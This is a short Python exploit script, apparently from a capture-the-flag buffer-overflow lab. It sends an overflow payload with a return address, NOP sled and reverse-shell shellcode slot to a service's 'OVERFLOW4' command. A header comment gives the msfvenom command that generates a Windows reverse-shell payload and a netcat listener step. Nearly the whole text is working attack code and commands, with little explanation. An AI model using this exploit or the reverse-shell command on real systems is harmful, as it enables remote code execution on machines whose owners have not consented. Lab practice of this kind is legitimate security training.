'''
cerate reverse shell using msfvenom

msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f c -a x86 -b "\x00\x12\x56\xfc\"
{
	copy hex 
}

=> listen on 4242 port nc

run script

=> gaining scipt
'''

import sys,socket
ip="10.10.167.41"
port = 1337
message = "OVERFLOW4 "
address = "\xaf\x11\x50\x62"
venom_code = ()					# 	enter reverse shell hex here 

shell_code = "A"*2023 + address + "\x90" * 32 + venom_code
payload = message + shell_code

try:
    s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    s.connect((ip , port))
    print("Sending payload...")
    s.send(payload)
    s.close()
except:
	print("Cann't not connected to server")
	sys.exit()
